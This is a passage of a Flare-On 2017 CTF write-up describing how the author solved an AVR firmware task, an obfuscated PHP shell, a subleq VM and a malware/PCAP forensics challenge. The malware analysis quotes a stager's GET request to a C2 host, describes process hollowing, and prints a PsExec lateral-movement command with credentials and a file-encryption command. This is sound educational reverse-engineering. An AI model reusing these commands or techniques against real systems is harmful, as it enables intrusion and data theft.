Simduino will open a /dev/pts that can be used for UART (so we can use tools
like `picocom` or `minicom` to debug it).

![image_alt](/assets/images/flareon-2017/cd4cd292a48fa1fc086b50e5617459edec3e9d40513de244bf57428f0c372348.png)

The firmware seems to be expecting a new PIN configuration: luckily I came
accross this information in the datasheet ("35. Register Summary").

![image_alt](/assets/images/flareon-2017/33d2e78e17819a705d01a9c9c0412090361e7ad02beb4692106996ac8e832f7b.png)

After trying
to manipulate the PINB and PINC (resp. at offset 0x23 and 0x26) without success,
I saw that a change of value in PIND (offset 0x29) immediately provoked a
response from the firmware:

```
$ avr-gdb  -q -ex 'target remote localhost:1234'
[...]
(gdb) set {char}0x29=0
```

In `picocom`:
```
Flare-On 2017 Adruino UNO Digital Pin state:0
```

Since the possible values are limited to 1 byte (8bit), and being lazy I wrote a
GDB script to bruteforce all the values
```
set $_i = 0
define inc_pind
        set $_i = $_i + 1
        set {char}0x29=$_i
        continue
end
```

And then I use `xdotool` to programmatically send the right xkeysyms commands to
the GDB terminal:
```bash
$ i=0; while [ $i -lt 256 ]; do sleep 5 ; xdotool key ctrl+c Up Return ; i=$((i + 1)); done
```

Went for a coffee, and when back saw the pleasant screen:

![image_alt3](/assets/images/flareon-2017/72de36af7ebcf629992d8b5f9f3a54e20cb01d6335fd961984d34b0840ea4b7e.png)

This challenge was a good reminder that reading the documentation first kept me
from spending probably hours of not understanding how the CPU was getting
input/output data from the PIN or what the ABI was doing. So more than ever, RTFM!

[Back to Menu](#menu)


# Challenge 10


## Instruction ##

```
We have tested you thoroughly on x86 reversing but we forgot to cover some of
the basics of other systems. You will encounter many strange scripting languages
on the Information Superhighway. I know that Interweb challenges are easy, but
we just need you to complete this real quick for our records.
```

## Solution ##

Another guessing game type of challenge. The challenge comes as a PHP script
named [`shell.php`](https://mega.nz/#!MUAWhDTQ!qzAe4c6O0ADp3YyfCNVF0gimNSs44kvpLWwqcoldoKs). It was solvable in 3 different steps:

### Step 1: get the key length ###

This script is a mess so the cleaned version was
pushed [here](https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-clean-php).

This challenge is not about cracking the MD5 hash given, but reversing the way
the variable `$block` is manipulated with the XOR operation. We don't know the
key `$param`, including its length. However, we do know that after [L4](https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-clean-php-L4) the
`strlen($param)` will be in [32..64]. Additionally, we know after this line that
every byte of `$param` is in the hexadecimal namespace ("0123456789abcdef"). And
finally, because of the call
to [`create_function`](http://php.net/manual/en/function.create-function.php)
line 15, we know that the block once de-XOR-ed will have all bytes in
`string.printable`.

Now the guessing game starts: we must guess at the same time the length and
the key. So the idea is in pseudo-code

```
assuming len(key) = 32
assuming charset = "0123456789abcdef"
let candidate = (key[0], len(32))
test if key[0] ^ block[0] in string.printable and \
     if (key[0] ^ block[0]) ^ block[0 + len(key)]in string.printable and \
     etc.
if any fails: reject candidate
```

This gives us a good iteration pattern, allowing us to narrow down all possible
values **and** find the possible length for the key, as done in [`bf1.py`](https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-bf1-py)

```bash
$ python bf1.py
pos=0 char='c' len=64
pos=0 char='d' len=64
pos=0 char='e' len=64
pos=1 char='a' len=64
pos=1 char='b' len=64
pos=1 char='c' len=64
pos=1 char='d' len=64
pos=1 char='e' len=64
pos=2 char='0' len=64
pos=2 char='1' len=64
pos=2 char='2' len=64
pos=2 char='3' len=64
[...]
```

Unanimously, we find that if the length of `$param` is 64 bytes, we have at
least one candidate that ensures that we can de-xor `$block` and get ASCII back
for each byte of the key.

So if `$param = md5($param) . substr(MD5(strrev($param)), 0, strlen($param));`
and `strlen($param) == 64`, it means that our key `o_o` is 32 byte long, which
way too huge to bruteforce. Consequently we must unxor the block by another way,
without knowing the key.


### Step 2: unxor all the blocks! ###

The Step1 allowed us to get the key length along with a list of potential
candidates for each position ([0, 63]).
This 2nd step directly extends the earlier one by trying to bruteforce chunk by
chunk.

This will be the main idea:

```
possible_candidates = {0: "abc", 1: "012", 2: "f", etc...}
possible_block = []
block_size = 4  # pure assumption
for candidate in generate_all_candidates( possible_candidates[0:block_size] ):
  if candidate ^ block[key_length*0:key_length*0 + 4] in string.printable and \
     candidate ^ block[key_length*1:key_length*1 + 4] in string.printable and \
     candidate ^ block[key_length*2:key_length*2 + 4] in string.printable and \
     etc.. :
     possible_block.append(candidate)
```

I used Python's `itertools.product` to generate all the candidate blocks, and
little by little recovered the value for `$param`:

```
$ python bf2.py
possible_key=de6952b84a49b934acb436418ad9d93d237df05769afc796d063000000000000
(0, '$c=\'\';\r\n$key = "";\r\nif (isset($_POST[\'o_o\']))\r\n  $ka')
(64, 'oXo\'];\r\nif (isset($_POST[\'hint\']))\r\n  $d = "www.p01*')
(128, "stet($_POST['t'])) {\r\n  if ($_POST['t'] == 'c') {\r\n$")
(192, "63_decode('SDcGHg1feVUIEhsbDxFhIBIYFQY+VwMWTyAcOhEYE")
(256, 'DJXTWxrSH4ZS1IiAgA3GxYUQVMvBFdVTysRMQAaQUxZYTlsTg0MA')
(320, 'whbXgcxHQRBAxMcWwodHV5EfxQfAAYrMlsCQlJBAAAAAAAAAAAAE')
[...]
```

After a few iteration, it appears that the encoded block contains not just pure
PHP but also HTML, which allowed me to perfect the [condition for finding a valid candidate](https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-bf2-py-L6)

After many iterations, we get the value for `$param`:
```
$param = "db6952b84a49b934acb436418ad9d93d237df05769afc796d067bccb379f2cac";
```


### Step 3 ###

Entering the correct value for `$param` found in step 2 allow us to discover the
[decoded script](https://gist.github.com/hugsy/8fa710e906033f377e68c24dce44070e#file-decoded_script-php) passed
to `create_function()`.

And back to square 1, we have 3 new base64-encoded blocks to decode. Depending
on the value given in the `$_POST['t']` (can be 'c', 's' or 'w'), will split the
key every 3 character, starting from index 0, 1, or 2 (respectively).

I took a huge assumption here, which was that `$key` would be the flag to end the
challenge. Therefore, even though we don't know its length (yet), we know that
it ends with `@flare-on.com`.

So for this step, I used the same technique than step2 but split the key every 3
characters and see if the block of byte was successfully decoded.

```python
key = "fla"+"re-"+"on."+"com"
for j in range(3):
    k = key[j::3]
    for i in range(11):
        x = xor( b64d(c), "A"*i+k)[i::i+len(k)]
        if is_all_printable(x):
            print j, i, repr(x)
```

Just like step1 this approach gives us 2 possible length for the flag prefix
(i.e. before `@flare-on.com`): 8 or 9 bytes.

So there again, semi-manual bruteforce:

```
i = 9
k0 = key[0::3]
for t in string.printable:
    p = "A"*(i-1) + t + k0
    x = xor(b64d(c), p)
    b = all_printable_blocks(x, i-1, len(p), len(p)-(i-1))
    if b != []:
        print p, b
```

We quickly notice that the output has some HTML in it, so we can discard
candidates with invalid HTML patterns. For example:

```
➜  python  bf.py
AAAAAAAA0froc ['8titl', 'ged C', '`</ti', ')- Ma', "41' H", '\t\n<bo', 'pext=', 'klor=', 'kd0="', '0froc', '$titl', 'phieu', 'anri"', 'gript', 'perva', '/=7,i', "X\\n';", '/=P[i', 'n-j+n', '6])j=', 'jerHT', 'ge(4)', '+scri', 'kdy>\r']
AAAAAAAA2froc [':titl', 'eed C', 'b</ti', '+- Ma', "61' H", '\x0b\n<bo', 'rext=', 'ilor=', 'id0="', '2froc', '&titl', 'rhieu', 'cnri"', 'eript', 'rerva', '-=7,i', "Z\\n';", '-=P[i', 'l-j+n', '4])j=', 'herHT', 'ee(4)', ')scri', 'idy>\r']
AAAAAAAA3froc [';titl', 'ded C', 'c</ti', '*- Ma', "71' H", '\n\n<bo', 'sext=', 'hlor=', 'hd0="', '3froc', "'titl", 'shieu', 'bnri"', 'dript', 'serva', ',=7,i', "[\\n';", ',=P[i', 'm-j+n', '5])j=', 'ierHT', 'de(4)', '(scri', 'hdy>\r']
AAAAAAAA4froc ['<titl', 'ced C', 'd</ti', '-- Ma', "01' H", '\r\n<bo', 'text=', 'olor=', 'od0="', '4froc', ' titl', 'thieu', 'enri"', 'cript', 'terva', '+=7,i', "\\\\n';", '+=P[i', 'j-j+n', '2])j=', 'nerHT', 'ce(4)', '/scri', 'ody>\r']
AAAAAAAA5froc ['=titl', 'bed C', 'e</ti', ',- Ma', "11' H", '\x0c\n<bo', 'uext=', 'nlor=', 'nd0="', '5froc', '!titl', 'uhieu', 'dnri"', 'bript', 'uerva', '*=7,i', "]\\n';", '*=P[i', 'k-j+n', '3])j=', 'oerHT', 'be(4)', '.scri', 'ndy>\r']
[...]
```

Only code with key=AAAAAAAA4froc makes most sense so it *must* be it. So we'll
assume this is how the key ends, and bruteforce the byte before, and so on, and
so forth. Reiterating this for all bytes, we get the first subkey to be
`k0='t_rsaat_4froc'`.

And reiterating the exact same thing for the 2nd and 3rd base64-encoded block
and we get all the subkeys:

```
>>> k0='t_rsaat_4froc'
>>> k1='hx__ayowkleno'
>>> k2='3Oiwa_o3@a-.m'
>>> ''.join([''.join(x) for x in zip(k0, k1, k2)])
'th3_xOr_is_waaaay_too_w34k@flare-on.com'
```


[Back to Menu](#menu)


# Challenge 11


## Instruction ##

```
Only two challenges to go. We have some bad hombres here but you're going to get
the keys out.

```

## Solution ##

This challenge was out of space! And so fun! It comes as a PE32 file
named [`covfefe.exe`](https://mega.nz/#!EdIHXLxD!ctm5aE88lVss0EafshM0APMebGDSjhEcXajC6F8GVYc).

The most notable string ([http://bitly.com/98K8eH](http://bitly.com/98K8eH))
from the PE points us nostalgically to
Rick Astley timeless masterpiece, "Never Gonna Give You Up".

Many other strings appear, but are weirdly aligned to one DWORD per character:
![image_alt](/assets/images/flareon-2017/a0e353204c9ddbd73d9a71c3c6ec53ba7c068d4ab487d43726ebfbe66aef3e8b.png)

Actually `covfefe.exe` is very simple, and only asks for finding a correct
password. The PE itself only:

 1. randomly chooses an integer in [0, 9[ and store in 0x0403008+0x110*4
 2. starts the VM itself at 0x0403008, and jumps to it

The VM is an array of `int32_t` so
`logique_addr_in_pe = 0x0403008 + relative_addr_in_vm*4`

The execution of the virtual machine starts at `pc_start = vm + 0x463`. And each
instruction is executed in the same way:

```
execute_instruction(operand1, operand2, operand3) {
  [operand2] = [operand2] - [operand1]
  if [operand2] <= 0 && operand3 != -1:
     pc = op3  // jump_to
}
```

Since the code is super easy, I decided to recreate the C source code from
it. So first, I used WinDBG to dump the VM location:

```
0:000> .writemem F:\flareon_2017\11\dumpmem-00403000-L5000.dmp
```

And used this to create
a
[C script](https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-cov-c) that
would run the VM as well. The reason for that is that now I can set breakpoint
and analyse the VM more precisely. I also used Binary Ninja to
write
[a new custom architecture](https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-binja-covfefe-py). The
reason for that
being that it greatly helped tracking down operations at the bytecode level
of the VM.

![image_alt](/assets/images/flareon-2017/202dd92a07c692ff036fd5b27d7ff1c85f1af93cd33007abf2fb31bd44498270.png)

We know that we must provide a good password to validate the task. So there must
be a comparison that fails as soon as a wrong character is entered. Those
new tools were of great help to identify the culprit: the comparison instruction
is done in the block at 0xde6.

![image_alt](/assets/images/flareon-2017/a25240fe0264b71f12bf0371e663fe5357dd0b9f6366056b34814a5bd2670e2b.png)

Now that we know that, all I need was to use the C script to "set a breakpoint"
at 0xde9 and see what value was expected.
![image_alt](/assets/images/flareon-2017/dc8897ca8ce6dc0a124da94b1e7e7ddf7fc442b137930a003c31875b547c3ec9.png)

Knowing this, creating the bruteforce script
([cov.py](https://gist.github.com/hugsy/12ffb0aaacbf87db3247ad1a07acb13c#file-cov-py))
was the next immediate step:

![image_alt5](/assets/images/flareon-2017/5afbab3abc4ad96ab713f58c496eaee64e2efb5ae92760a084c6f5cf55a90caa.png)

And finally recover the key to this level = `subleq_and_reductio_ad_absurdum`.

[Back to Menu](#menu)


# Challenge 12


## Instruction ##

```
Sorry, we don't have a challenge for you. We were hacked and we think we lost
it. Its name was "lab10" . The attacker left one binary behind and our
sophisticated security devices captured network traffic (pcap) that may be
related. If you can recover the challenge from this and solve it then you win
the Flare-On Challenge. If you can't then you do not win it.
```

## Solution ##

This level alone could have been an entire CTF. It came as 2 files:

  1. an 85KB PE32 file, [`coolprogram.exe`](https://mega.nz/#!ARJTwKTI!E2LSMjIHfh4bQDMDyfaxP8hKtYnWJ2IyEbqiRLyH7uQ)
  1. a 5.5MB PCAP trace,
     [`20170801_1300_filtered.pcap`](https://mega.nz/#!oZZygDab!c1pCq8ieSkTtTqkyaLk4he421AehJW18U-L_v_pa5MI)


### Extracting secondstage.exe ###

`coolprogram.exe` is a Borland compiled PE file that is nothing more than a
stager to download and execute the real payload. Using API Monitor, we can trace
that it attempts to connect to FQDN `maybe.suspicious.to`, checking also that
the domain name doesn't point to the localhost

![image_alt](/assets/images/flareon-2017/c1de5ea5895e4bb38d54167604de4dff8c75dd14d757d40b1d1992419d085232.png)

The behavior seems consistant with the first TCP stream of the PCAP. However,
the data received seems encoded/encrypted:

```
GET /secondstage HTTP/1.1
Accept: */*
Accept-Language: en-us
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Host: maybe.suspicious.to
Cache-Control: no-cache

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.12
Date: Tue, 01 Aug 2017 17:04:02 GMT
Content-type: application/octet-stream
Content-Length: 119812
Last-Modified: Tue, 01 Aug 2017 14:46:13 GMT

7.=|...WEz.....:&.uBLA.5.su..m..>j.-....4..|.....Mu%R{.......U..(Fl.;./.....QM.G...O
[...]
```

IDR and IDA helped identify the "real main" function to be at 0x04103DC, which
performs sequentially the following operations:

  1. unxor the URL from memory: the URL is located at 0x04102B4 and xor-ed with
     0x73
  1. perform the HTTP GET request to get the `secondstage`
  1. decode the buffer, recovering a valid PE file, `secondstage.exe`
  1. invoke `secondstage.exe` by [hollowing](https://www.trustwave.com/Resources/SpiderLabs-Blog/Analyzing-Malware-Hollow-Processes/) the default HTTP browser

![image_alt](/assets/images/flareon-2017/7d5697ef3325169816f81bd29388f6575c6dd51d23d9fcf11c26dc778f29b354.png)

Instead of decoding manually the encoded response from the C2 server, we can be
lazy by recovering `secondstage.exe` breaking at 0x4104C1:

```
0:000> bp  0x4104C1; g
Breakpoint 0 hit
[...]
0:000> !dh edx

File Type: EXECUTABLE IMAGE
FILE HEADER VALUES
     14C machine (i386)
       5 number of sections
592F22F3 time date stamp Wed May 31 13:09:23 2017

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
     102 characteristics
            Executable
            32 bit word machine

[...]
0:000> .writemem F:\flareon_2017\12\secondstage.exe edx l1d400
Writing 1d400 bytes...........................................................
```

### Initial analysis secondstage ###

Thanks to CFF Explorer, one can easily edit `secondstage.exe` PE header to
deactivate the randomization of the code by
unsetting
[`IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx)
and rebuild the header.

`secondstage` analysis starts at 0x405220 by initializing a bunch a stuff,
including loading all dynamically loaded functions into an array of points,
ensuring a bit of obfuscation during static analysis, since all function calls
will be performed by indirect calls. Then if the executable is run on
client-side, initiates the connection to the C2 server:

![image_alt](/assets/images/flareon-2017/ae6aff7a8232b182109f61df0cd50bf78f7ce4a5f162c8c16a5591b5f0f7aecc.png)

![image_alt](/assets/images/flareon-2017/a06c9b431092bbd3e382f3d703dbe4828d0702f0140ee009aac3b341c145c32e.png)

Every time a packet is received the function 0x0402C50 is called for parsing the
new message, and sending the answer back. The C2 is still behind the FQDN
`maybe.suspicious.to` which in the PCAP file is associated to the IP address
52.0.104.200.


### Reversing the communication protocol ###

A big part of this challenge consisted in understanding the protocol, because
once entirely assimilated, every piece of code would fall into place.

An initial glimpse into the second TCP stream of the PCAP reveils already many
valuable information regarding the protocol:

  1. it is a non-standard (i.e. custom) binary protocol
  1. it is (for most part) non encrypted
  1. some parts of the header can be instantly recognized (magic='2017', the
     size of the header, size of the data, etc.)
  1. it transmits some PE code (presence of strings like "text", "rdata",
     "reloc", "kernel32.dll", names of methods, etc.)

The function 0x403210 reveals a whole deal regarding the protocol: when a new
packet is received, the function ensures that its length is at least 0x24 bytes,
and that the first 4 bytes are equal to "2017". This will be the aspect of the
first 0x24 bytes of header:

```
0000 "2017"
0004 DataCheckSum
0008 HeaderSize
000c DataSize
0010 DataSize2  // this field is explained later on
0014 Magic_of_Module
```

What the hell are those modules? What is their magic number?

To understand that, I wrote a "replayer" that would spoof the C2 IP address, and
replay all the packets to the instance of `secondstage`. After a few packets,
the `!address` showed that some new memory areas were allocated in the address
space, all with `PAGE_EXECUTE_READWRITE` permission, all starting with
`LM...`. Searching for the constant 0x4d4c ('LM' in little endian), IDA spotted
the instruction `004053CE cmp     edx, 4D4Ch`, which happens to be followed by a
call to `Kernel32!VirtualAlloc()` with `PAGE_EXECUTE_READWRITE` (0x40) set for
permission, then a `LoadLibraryA`. This must be it, so we can now use WinDBG to dump all those modules:

```
0:000> bp 004053ce ; g
0:000> dd ecx+poi(ecx+3c)+50 l1
0018d2b8  00017000
0:000> .writemem E:\secondstage-lm-<id>.dll ecx lpoi(ecx+poi(ecx+3c)+50)
Writing 17000 bytes..............................................
```

8 modules were found. Each of them can be convert back to a valid PE format by
replacing "LM\x00\x00" with "MZ\x00\x00", and "NOP\x00" with
"PE\x00\x00". Finally the entrypoint must be xored with the value 0xABCDABCD.

![image_alt](/assets/images/flareon-2017/bbcda00a98ff78d846bfa7a6e2b0e846cdcd50a8cc7cd8b4b4a8b79f4a1b49db.png)

### Reversing the "Loadable Modules" ###

All those modifications give us 8 DLL that are sent by the C2 and loaded in
`secondstage`, with the following names in them

  1. r.dll
  1. t.dll
  1. 6.dll
  1. x.dll
  1. z.dll
  1. f.dll
  1. s.dll
  1. m.dll

Using Diaphora to bin-diff those DLL showed that they are 99% similar, except
for a handful of functions. So naturally I focused reversing only those
functions.

In all DLLs (and even `secondstage`), one function could always be found doing
something like:

```c
if (memcpy(pkt->Magic_of_Module, magic_array_of_0x10_bytes, 0x10)==0){
  data = malloc( pkg->DataSize2 );
  /* process(pkt) */
}
```

Which appears to be the function called when a packet is received, and that the
"magic" field matched to the DLL. Symetrically, another function could be found,
but this one to build a response packet from this module.  Reversing all those
modules could be summarized in the table below:


| Name | Magic  | Description  | Category |
| secondstage.exe | 51298F741667D7ED2941950106F50545  | Handles basic packets handling, loads modules, sends MessageBox messages, stop process, etc.  | * |
| r.dll | C30B1A2DCB489CA8A724376469CF6782 | [RC4](https://en.wikipedia.org/wiki/RC4) implementation  | CRPT |
| t.dll | 38BE0F624CE274FC61F75C90CB3F5915 | Byte shuffling | CRPT |
| 6.dll | BA0504FCC08F9121D16FD3FED1710E60 | Base64 (with custom alphabet) implementation  | COMP|
| x.dll | B2E5490D2654059BBBAB7F2A67FE5FF4 | Modified [XTEA](https://en.wikipedia.org/wiki/XTEA)  | CRPT |
| z.dll | 5FD8EA0E9D0A92CBE425109690CE7DA2 | [zlib](https://zlib.net) | COMP |
| f.dll | F47C51070FA8698064B65B3B6E7D30C6 | *didn't see the need for reversing* | ? |
| s.dll | F46D09704B40275FB33790A362762E56 | Send/Receive commands  | CMD |
| m.dll | A3AECCA1CB4FAA7A9A594D138A1BFBD5 | Desktop Screenshot | CMD |

3 types of plugin actions can be found (as detailed by 0x04025DF):

 * `CMD`: send and receive command to the client (get OS information, execute
   command in terminal, etc.)
 * `CRPT`: cryptographic operation
 * `COMP`: compression operation

And here is where the header field `DataSize2` (at header+0x10) comes in handy:
actions triggered by crypto or compression modules can produce an output whose
length is different from the original `header.DataSize`. So the field
`DataSize2` indicates the size of the output **after** the cryptographic or
compression operation has been done. Although some crypto operations were used, the key (and IV when needed) could
always be found in the message header.

Chaining modules together allows to create some pretty complex
output (for example `Base64( zlib_deflate( XTEA(data) ) )` ), that would be
absolutely impossible to reverse correctly, solely with the static analysis of
the PCAP file. So if we want to reconstruct the data, we must write a parser at some point to
parse the data of the PCAP (the final version of the parser can be [found here](https://gist.github.com/hugsy/9b141827b66843ebbabc183731649f53#file-level12-py)).


### Reconstructing the screen capture ###

![image_alt](/assets/images/flareon-2017/18a58c8dbdd8b039dc0b8492474e2ae4c0180ecc2e88a26f2d5708059aee9d4b.png)

`m.dll` captures the desktop as a bitmap and send the raw data back to the C2
(uses the same function as
the
[MSDN example](https://msdn.microsoft.com/en-us/library/windows/desktop/dd183402(v=vs.85).aspx)). But
because it is a pure bitmap, there is no information of the dimensions of the
image. In addition, the image is split in several packets, some of them are sent
in plaintext, like this

```
00010A26  32 30 31 37 49 d8 69 59  24 00 00 00 4c 40 00 00   2017I.iY $...L@..
00010A36  4c 40 00 00 51 29 8f 74  16 67 d7 ed 29 41 95 01   L@..Q).t .g..)A..
00010A46  06 f5 05 45 1c 00 00 00  30 40 00 00 30 40 00 00   ...E.... 0@..0@..
00010A56  f3 71 26 ad 88 a5 61 7e  af 06 00 0d 42 4c 5a 21   .q&...a~ ....BLZ!
00010A66  17 04 17 20 03 00 00 00  51 00 00 00 00 00 00 00   ... .... Q.......
00010A76  00 00 00 00 a3 ae cc a1  cb 4f aa 7a 9a 59 4d 13   ........ .O.z.YM.
00010A86  8a 1b fb d5 00 00 01 00  38 d1 0f 00 00 40 00 00   ........ 8....@..
00010A96  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
00010AA6  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
00010AB6  f7 f7 f7 f7 f7 f7 f7 f7  f7 f7 f7 f7 f7 f7 f7 f7   ........ ........
[...]
```

Whereas others are compressed and/or encrypted by the different algorithms
mentioned above. However, they are all sent sequentially. Once all the fragments
extracted by the parser, they were merged into a raw file. Thanks to a good tip
by <a class="fa fa-twitter" href="https://twitter.com/alex_k_polyakov" target="_blank"> alex_k_polyakov</a>, I used the
website [RawPixels.net](http://rawpixels.net), and when setting a resolution of
1420x720, the following capture showed up:

![image_alt6](/assets/images/flareon-2017/018ab4320dc95fa3b751227369cd27f7ee759579323d695c2453bcf9966179e0.png)

After all those efforts, finally a good lead on the challenge to find.


### More Loadable Modules !! ###

Continuing the replay of packets showed something very interesting:

![image_alt](/assets/images/flareon-2017/01c609d44427749a2caa64d7cb8ae54f41788be7313e2c94fd9cd8f65476cc9c.png)

`secondstage.exe` was sending commands to a child process `cmd.exe`, attempting
to reach a host whose NetBIOS name is `larryjohnson-pc`, and if found, would run
drop 2 files in `C:\staging`, `pse.exe` and `srv2.exe`. Finally it would execute
the command:

```
pse.exe \\larryjohnson-pc -i -c -f -d -u larry.johnson -p n3v3rgunnag1veUup -accepteula srv2.exe
```

`pse.exe` is nothing more
than
[`SysInternals PsExec`](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec),
so the command would push and execute `srv2.exe` as the user `larry.johnson`. If
all went well, `secondstage.exe` then attempts to load a new Loadable Module,
`p.dll`, whose magic is 77D6CE92347337AEB14510807EE9D7BE. This DLL will be used
to proxy the packets from/to the C2 directly to `srv2.exe` via `secondstage.exe`. In
addition, the C2 then sends a few new Loadable Modules to the running `srv2.exe`
process:

| Name | Magic  | Description  | Category |
| b.dll | 2965E4A19B6E9D9473F5F54DFEF93533 | Blowfish implementation (CBC Mode) | CRPT |
| e.dll | 8746E7B7B0C1B9CF3F11ECAE78A3A4BC | Block XOR | CRPT |
| d.dll | 46C5525904F473ACE7BB8CB58B29968A | DES implementation (CBC Mode) | CRPT |
| c.dll | 9B1F6EC7D9B42BF7758A094A2186986B | Camellia implementation (ECB Mode) | CRPT |
| a.dll | 503B6412C75A7C7558D1C92683225449 | ApLib compression | COMP |
| l.dll | 0A7874D2478A7713705E13DD9B31A6B1 | LZO compression | COMP |

[Back to Menu](#menu)

### Smart parsing of the PCAP ###

It is altogether 15 Loadable Modules that are needed to be implemented for
decompression or decryption. In some cases, the implementation of the algorithm
was not standard (for example RC4), so I had to rewrite from scratch according
to the reversed DLL solely. Particularly the ApLib module was a pain to use properly.

But it was critical that our implementation strictly stick  to the one from the
module. So a lot (a LOOOOOT) of testing was required all the time, as even a one
byte mistake could make the content of a packet unreadable for the upper layer,
leading to not be able to decrypt files later on...

But after some long hours perfecting the decrypting script, [the result](https://gist.github.com/hugsy/9b141827b66843ebbabc183731649f53#file-level12-py) pays off
directly, and all traffic is now in plaintext, revealing some crispy information:

![image_alt](/assets/images/flareon-2017/0d1da3b02573a0f2c451b9cf801355666639e4454e26ea138b1836bdd969b36e.png)

![image_alt](/assets/images/flareon-2017/54e0782509ce641e04edd2b4bb2fef3d80f31c6640451952464ff9d50b5cb851.png)

2 new files can be found from the extract:

  1. `cf.exe` a C# compiled file
  1. a 561972 byte file beginning with the pattern `cryp`

`cf.exe` doesn't show much mystery: it takes 2 parameters, a path to file, and a
base64 encoded key. And it will AES encrypt the file with the given key.

![image_alt](/assets/images/flareon-2017/0fbe4ce9c0d1295088fa6938b36081272c976a99ca80fef5f27ec3c89ea0cafb.png)

As seen in the capture above, we were capable of decrypting the packet that
holds the command used for encrypting the file.

```
c:\staging\cf.exe lab10.zip tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=
```

So we can build a decryptor in few lines of Python

```python
import base64, sys, hashlib, struct
from Crypto import Random
from Crypto.Cipher import AES

BLOCK_SIZE = 32
def p32(x): return struct.pack("<I",x)
def u32(x): return struct.unpack("<I",x)[0]

def decrypt(encrypted, passphrase, iv):
    aes = AES.new(passphrase, AES.MODE_CBC, iv)
    return aes.decrypt(encrypted)

if __name__ == "__main__":
    data = open(sys.argv[1]).read()
    print("[+] data_size = 0x%x" % len(data))
    key = base64.b64decode("tCqlc2+fFiLcuq1ee1eAPOMjxcdijh8z0jrakMA/jxg=")
    i = data.find("cryp")
    i += 4
    iv = data[i:i+0x10]
    print("[+] iv: %s" % iv.encode('hex'))
    i += 0x10
    sha = data[i:i+0x20]
    print("[+] sha: %s" % sha.encode('hex'))
    i += 0x20
    enc = data[i:]
    dec = decrypt(enc, key, iv)
    sz = u32(dec[:4])
    filename = dec[4:4+sz]
    filesize = u32(dec[4+sz:4+sz+4])
    print("[+] filepath '%s'" % filename)
    print("[+] filesize 0x%x" % filesize)
    i = 4+sz+8
    decrypted_file_content = dec[i:i+filesize]
    print("[+] len(decrypted) 0x%x, writing 'lab10.zip'..." % len(decrypted_file_content))
    open("lab10.zip", "wb").write(decrypted_file_content)
```

```
$ python uf.py crypfile
[+] data_size = 0x89334
[+] iv: fec85f816b82806996fc991b5731d2e1
[+] sha: 797c33964e0ed15a727d4175c2bff5a637da6587229cce9bd12d6a13cf8596db
[+] filepath 'c:\work\flareon2017\package\lab10.zip'
[+] filesize 0x892c6
[+] len(decrypted) 0x892c6, , writing 'lab10.zip'...
```

We've got the real challenge!
And to conclude, unzip `lab10.zip` with the password from the screenshot:
`infectedinfectedinfectedinfectedinfected919`. This will drop a file in
`GoChallenge/build/challenge10`, which is a Go challenge in ELF. But when we
execute it, we see a well deserve reward:

```bash
root@kali2:/ctf/flareon_2017/12 # ./GoChallenge/build/challenge10
hello world
The answer is: 'n3v3r_gunna_l3t_you_down_1987_4_ever@flare-on.com'
```


# Conclusion #

Thank you to FireEye for those fun challenges... and congratulations to all the
winners (especially those who managed to finish in under a week, massive
props)!! I hope those writeups don't make those challenges look trivial, they
weren't (only ~130 over more
than [a thousand participants](https://twitter.com/mikesiko/status/904388540267610112)
completed the 12 challenges). IMHO, some challenges (like the end of challenge 4
or 10) involved too much guessing, which can be very (VERY) frustrating.

But all in all, it was a fun experience... And thank you for whomever prepared
challenge 12, it was **huge** in all the possible meanings, and it must
certainly have required a serious patience to build!

And final thanks to <a class="fa fa-twitter" href="https://twitter.com/alex_k_polyakov" target="_blank"> alex_k_polyakov</a>,
<a class="fa fa-twitter" href="https://twitter.com/n4x0r31" target="_blank"> n4x0r31</a> and <a class="fa fa-twitter" href="https://twitter.com/@aymansagy" target="_blank"> @aymansagy</a>.

See you next year for Flare-On 5!
